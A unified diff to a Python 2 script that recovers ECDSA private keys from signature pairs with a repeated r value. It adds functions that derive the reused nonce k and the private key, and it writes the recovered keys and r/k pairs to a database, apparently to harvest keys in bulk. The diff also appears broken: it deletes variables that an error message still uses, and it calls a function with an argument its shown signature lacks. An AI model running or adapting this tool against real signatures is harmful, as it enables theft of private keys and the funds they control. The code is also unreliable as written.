@@ -86,6 +86,16 @@ def inverse_mult(a,b,p):
 	return y
 
 # here is the wrock!
+
+def derive_k(p,s1,s2,z1,z2):
+	k = inverse_mult((z1-z2),(s1-s2),p) % int(p)
+	return k
+
+def derivate_from_k(p,r,s,z,k):
+
+	privkey = inverse_mult(((s * k) - z), r,p) % int(p)
+	return privkey
+
 def derivate_privkey(p,r,s1,s2,z1,z2):
 	privkey = []
 	
@@ -113,6 +123,16 @@ def try_insert(cursor,sql,d):
 	if (i == 80):
 		print ''
 		i = 0
+		
+def try_insert_RK(table,r,k,cursor):
+	r = inttohexstr(r).decode('hex')
+	k = inttohexstr(k).decode('hex')
+	sql = "INSERT IGNORE INTO RK VALUES (%s,%s)"
+
+	#print sql
+
+	try_insert(cursor, sql,(r,k))
+	return
 
 def try_insert_privkeys(privkeys,cursor):
 	ignore = False
@@ -169,12 +189,17 @@ def proccess_set(conn,sql1,sql2):
 								hash2 = bintointr(tmp[k][3])
 
 								#print_r(r1,s1,s2,hash1,hash2)
-								d = (s1-s2)
-								f = (s2-s1)
-
 								if (s1 != s2):				
 									privkeys = derivate_privkey(p,r1,s1,s2,hash1,hash2)
-									try_insert_privkeys(privkeys,cursor3)
+									k = derive_k(p,s1,s2,hash1,hash2)
+									
+									#privkeys.append(derivate_from_k(p,r1,s1,hash1,k))
+									#privkeys.append(derivate_from_k(p,r1,s2,hash2,k))
+
+									h += try_insert_privkeys(table,privkeys,cursor3)
+									
+									try_insert_RK('RK',r1,k,cursor3)
+
 								else:
 									print "Error Privkey not computable s1 == s2\n d:%s f:%s" % (hex(d),hex(f))
 									failed = True
